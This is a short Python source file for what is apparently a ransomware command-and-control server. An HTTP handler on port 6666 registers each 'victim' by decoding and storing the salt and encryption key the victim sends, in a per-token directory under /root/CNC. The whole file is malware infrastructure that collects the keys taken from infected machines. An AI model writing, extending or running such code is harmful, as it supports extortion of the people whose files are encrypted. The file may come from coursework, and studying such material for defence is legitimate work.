import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, token:str, salt:str, key:str):
        # register the victim to the CNC
        # token, salt and key are base64 field
        self.save_b64(token, salt, "salt")
        self.save_b64(token, key, "key")
           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()